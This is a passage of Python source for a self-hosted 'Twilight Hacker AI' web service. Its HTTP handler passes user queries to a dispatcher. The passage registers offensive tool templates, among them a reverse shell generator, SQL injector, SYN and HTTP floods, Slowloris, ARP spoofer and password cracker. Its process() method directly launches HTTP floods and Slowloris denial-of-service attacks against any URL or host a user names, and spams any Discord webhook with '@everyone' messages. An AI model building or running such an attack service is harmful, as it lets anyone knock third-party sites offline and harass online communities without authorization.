                self.send_header("Cache-Control", "public, max-age=3600")
                self.end_headers()
                with open(lp, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"error":"NOT_FOUND"}')
        elif path == "/api/status":
            self._json(self.ai.get_stats())
        elif path == "/api/tools":
            self._json({"tools": db.get_tools()})
        elif path == "/api/evolution":
            self._json({"iteration": self.ai.evolution.iteration, "ops": self.ai.evolution.total_ops, "ops_per_second": self.ai.evolution.get_ops_per_second()})
        else:
            self._serve_html(os.path.join(DATA_DIR, "web", "index.html"))
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        try:
            data = json.loads(body) if body else {}
        except:
            data = {}
        path = urlparse(self.path).path
        
        try:
            if path == "/api/query":
                query = data.get("query", "")
                model = data.get("model", "auto")
                result = self.ai.process(query, model)
                db.log_learning("query", "user", f"{query[:100]} -> {result.get('type','unknown')}", 1)
                self._json(result)
            else:
                self._json({"error": "UNKNOWN_ENDPOINT"})
        except Exception as e:
            self._json({"error": str(e)})
    
    def _serve_html(self, path):
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(content.encode("utf-8"))
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<h1>TWILIGHT HACKER AI</h1><p>INITIALIZING...</p>")
    
    def _json(self, data):
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data, default=str).encode("utf-8"))
    
    def log_message(self, fmt, *args):
        print(f"[{args[0]}] {args[1]} {args[2]}")


# ---------------------------------------------------------------------------
# Main AI Class
# ---------------------------------------------------------------------------
class TwilightAI:
    def __init__(self):
        self.start_time = time.time()
        self.img_gen = ImageGenerator()
        self.vid_gen = VideoGenerator()
        self.music_gen = MusicGenerator()
        self.speech_gen = SpeechGenerator()
        self.tool_gen = ToolGenerator()
        self.evolution = EvolutionEngine()
        
        self.evolution.start()
        
        for key, name in [
            ("port_scanner", "Port-Scanner"), ("sql_injector", "SQL-Injector"),
            ("reverse_shell", "Reverse-Shell-Gen"), ("xss_engine", "XSS-Engine"),
            ("directory_fuzzer", "Directory-Fuzzer"), ("syn_flood", "SYN-Flood"),
            ("http_flood", "HTTP-Flood"), ("slowloris", "Slowloris"),
            ("discord_webhook_spammer", "Discord-Webhook-Spammer"),
            ("arp_spoof", "ARP-Spoofer"), ("password_cracker", "Password-Cracker"),
            ("wifi_scanner", "WiFi-Scanner")
        ]:
            code = self.tool_gen.tool_templates.get(key, "")
            if code:
                db.save_tool(name, key, code, 0.5)
        
        db.log_learning("system", "system", f"Twilight Hacker AI v{VERSION} initialized")
    
    def process(self, query, model="auto"):
        q = query.strip()
        if not q:
            return {"error": "EMPTY_QUERY"}
        
        ql = q.lower()
        
        if model != "auto" and model in ["image", "tool", "music", "speech"]:
            intent = model
            style = "realistic"
        else:
            intent, style = classify_intent(q)
        
        # IMAGE
        if intent == "image":
            result = self.img_gen.generate(q, style)
            return {"type": "image", "image": result}
        
        # TOOL
        if intent == "tool":
            existing = db.search_tools(q)
            if existing:
                best = existing[0]
                db.increment_usage(best["name"])
                if best.get("code"):
                    return {"code": best["code"], "name": best["name"], "category": best["category"]}
            
            result = self.tool_gen.find(q)
            if result:
                return {"code": result["code"], "name": result["name"], "category": result.get("category", "auto")}
            
            # Direct execution for attacks
            # Discord webhook
            if "discord" in ql or "webhook" in ql:
                urls = re.findall(r'https?://discord(?:app)?\.com/api/webhooks/[^\s]+', q)
                if urls:
                    msg = "@everyone SPAM"
                    cnt = 50
                    nums = re.findall(r'(\d+)\s*(?:times?|messages?|count)', q)
                    if nums:
                        cnt = int(nums[0])
                    res = discord_webhook_spam(urls[0], msg, cnt)
                    return {"type": "attack", "attack_result": res, "name": "Discord Webhook Spammer"}
            
            # HTTP flood
            if "flood" in ql or "ddos" in ql:
                urls = re.findall(r'https?://[^\s]+', q)
                if urls:
                    res = http_flood(urls[0], 30, 15)
                    return {"type": "attack", "attack_result": res, "name": "HTTP Flood"}
            
            # Slowloris
            if "slowloris" in ql or "loris" in ql:
                hosts = re.findall(r'(?:host|target):\s*([^\s,]+)', q)
                if not hosts:
                    hosts = re.findall(r'(?:https?://)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', q) if '://' not in q else []
                if hosts:
                    res = slowloris_attack(hosts[0], 80, 100)
                    return {"type": "attack", "attack_result": res, "name": "Slowloris DoS"}
            
            return {"code": result["code"], "name": result["name"], "category": result.get("category", "auto")}
        
        # MUSIC
        if intent == "music":
            result = self.music_gen.generate(q)
            return {"type": "music", "music": result}
        
        # SPEECH
        if intent == "speech":
            text = q
            for prefix in ["say", "sag", "speech", "voice", "narrate", "tell", "pronounce"]:
                if prefix in ql:
                    idx = ql.index(prefix) + len(prefix)
                    t = q[idx:].strip().strip(":;,. \"'")
                    if t:
                        text = t
            voice = "default"
            for v in ["male", "female", "robot", "deep", "soft", "hacker"]:
                if v in ql:
                    voice = v
                    break
            result = self.speech_gen.generate(text, voice)
            return {"type": "speech", "speech": result}
        
        # VIDEO
        if intent == "video":
            dur = 3.0
            try:
                nums = re.findall(r"(\d+)\s*(sek|sec|s)", q)
                if nums:
                    dur = float(nums[0][0])
            except:
                pass
            result = self.vid_gen.generate(q, duration=dur)
            return {"type": "video", "video": result}
        
        # CHAT fallback: try tool, then image
        result = self.tool_gen.find(q)
        if result:
            return {"code": result["code"], "name": result["name"], "category": result.get("category", "auto")}
        result = self.img_gen.generate(q, "realistic")
        return {"type": "image", "image": result}
    
    def get_stats(self):
        stats = db.get_stats()
        uptime = int(time.time() - self.start_time)
        d = uptime // 86400
        h = (uptime % 86400) // 3600
        m = (uptime % 3600) // 60
        stats["uptime"] = f"{d}d {h}h {m}m"
        stats["ops_per_second"] = self.evolution.get_ops_per_second()
        stats["evolution_active"] = self.evolution.running
        stats["iteration"] = self.evolution.iteration
        stats["total_ops"] = self.evolution.total_ops
        return stats


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print("=" * 60)
    print(f"  {NAME} v{VERSION}")
    print("  ALL MODULES ACTIVE")
    print("=" * 60)
    
    _ = Database()
    generate_html()
    ai = TwilightAI()
    
    stats = ai.get_stats()
    print(f"\n  Tools: {stats['tools']}, Knowledge: {stats['knowledge']}")
    print(f"  Evolution: ~{ai.evolution.get_ops_per_second():,} ops/s")
    print(f"  Server: 0.0.0.0:{PORT}")
    print(f"  Railway ready - listening on port {PORT}")
    
    Handler.ai = ai
    server = HTTPServer(("0.0.0.0", PORT), Handler)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Shutting down...")
        ai.evolution.stop()
        server.server_close()
        print("  System terminated")
